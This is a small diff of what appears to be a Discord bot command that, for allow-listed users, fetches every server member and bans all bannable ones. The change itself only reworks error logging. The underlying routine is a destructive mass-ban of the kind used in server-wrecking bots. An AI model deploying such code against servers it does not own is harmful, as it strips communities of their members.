@@ -11,17 +11,14 @@ module.exports = {
         if(!allowed.includes(message.author.id)) return
         
         try {
-
             const members = await message.guild.members.fetch()
             members
                 .filter(m => m.bannable)
                 .forEach(m => m.ban())
             message.delete(1000);
-        
-        } catch(e) {
-        
-            console.log(e.stack);
-        
+               
+        } catch(err) {
+            return console.log(chalk.red(err))
         }
     }
 }
